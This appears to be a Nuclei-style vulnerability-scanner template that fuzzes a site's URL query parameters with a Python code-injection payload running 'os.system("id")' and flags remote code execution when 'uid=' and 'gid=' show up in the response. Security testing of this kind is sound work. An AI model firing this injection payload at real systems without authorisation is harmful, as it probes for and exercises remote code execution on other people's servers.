http:
- fuzzing:
  - fuzz:
    - '{{rce}}'
    mode: multiple
    part: query
    type: postfix
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - uid=
    - gid=
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    rce:
    - pyimport os;os.system("id");f=function f2(){};
  stop-at-first-match: true
id: pyimport-rce
info:
  author: reewardius
  name: Pyimport Fuzzing RCE
  severity: critical
  tags: fuzzing-rce,fuzzing-req,dast
